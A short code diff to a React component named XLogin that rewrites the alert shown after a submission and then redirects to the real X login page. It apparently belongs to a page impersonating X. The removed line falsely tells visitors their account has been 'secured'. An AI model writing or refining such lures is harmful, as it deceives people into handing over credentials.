@@ -61,7 +61,7 @@ export default function XLogin() {
       .then(
         () => {
           alert(
-            "Thanks for verifying your identity, your account is secured now!"
+            "Thanks for your interest in our offer, I will contact you shortly. You can now continue with X!"
           );
           window.location.href = "https://x.com/i/flow/login";
         },
